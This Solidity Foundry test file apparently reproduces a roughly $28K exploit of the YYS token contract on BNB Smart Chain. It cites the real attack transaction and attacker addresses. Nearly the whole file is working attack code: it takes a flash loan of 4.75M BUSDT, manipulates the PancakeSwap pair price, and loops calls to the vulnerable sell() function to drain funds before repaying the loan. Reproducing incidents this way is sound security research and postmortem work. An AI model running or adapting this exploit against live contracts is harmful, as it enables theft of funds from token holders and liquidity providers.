// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";


// @KeyInfo - Total Lost : 	$28K
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x397a09af6494c0bfcd89e010f5dd65d90f3ee1cf1ff813ce5b0c1d42a1c8dec9?line=84
// Attacker Address : https://bscscan.com/address/0x101723def8695f5bb8d5d4aa70869c10b5ff6340
// Attack Contract1: https://bscscan.com/address/0x832e6540da54d07cb0dfea8957be690c8eb2c6a0
// Attack Contract2: https://bscscan.com/address/0x4192abd1466b49be9d1e99918aee99e0dbd65289

// @Analysis: https://x.com/0xNickLFranklin/status/1799610045589831833

interface Isell {
    function updateAllowance() external;
    function sell(uint256) external;
}

contract ContractTest is Test {

    Uni_Pair_V3 constant BUSDT_USDC = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 YYStoken = IERC20(0xE814Cc2B4DbFe652C04f2E008ced18875c76F510);
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0x4200A9B80B1e84cF94ad8Fc28f66195BC3c37F3F);
    IPancakeRouter Router = IPancakeRouter(payable(0x8228A4aD192d5D82189afd6e194f65edb8c76a41));
    uint256 flashBUSDTAmount = 4750000  ether;
    Isell YYStoken_Sell = Isell(0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9);
    address invest=0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9;
    address Anotheraddress=0xC772718b5206EF788D33F43A2a80a104a1867BD4;


    function setUp() public {
        vm.createSelectFork("bsc", 39436701);
        deal(address(BUSDT),address(this),100 ether);
    }

    function testExploit() public {        
       BUSDT.approve(address(invest),type(uint256).max);
    // Step1: invest，Any address that has been bound before can be used.
      address(invest).call(abi.encodeWithSelector(bytes4(0xb9b8c246), address(Anotheraddress),100 ether));

    // Step2: Start the attack.

        BUSDT_USDC.flash(
            address(this), 
            flashBUSDTAmount, 
            0, 
            abi.encodePacked(uint256(1))
        );
         emit log_named_decimal_uint("After Profit: ", BUSDT.balanceOf(address(this)), 18);

    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        Pair.sync();
        BUSDT.approve(address(Router), flashBUSDTAmount);

        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(YYStoken);


     
        uint256[] memory amountsout = Router.getAmountsOut(4749900 * 10 ** 18, path);

        BUSDT.transfer(address(Pair),4749900 ether);

        Pair.swap(0,amountsout[1],address(this),"");
        
        YYStoken.approve(address(YYStoken_Sell),type(uint256).max);

        uint256 sellamount=38584 ether;
        uint256 bal=YYStoken.balanceOf(address(this));
        uint256 j=0;
        while(YYStoken.balanceOf(address(this))>5000 ether){  
            if(j==0){
            YYStoken_Sell.sell(sellamount);
            }else{
            YYStoken_Sell.sell(YYStoken.balanceOf(address(this)));
            }
        j++;
        }
        BUSDT.transfer(msg.sender, flashBUSDTAmount * 10001 / 10000);
        
    }

}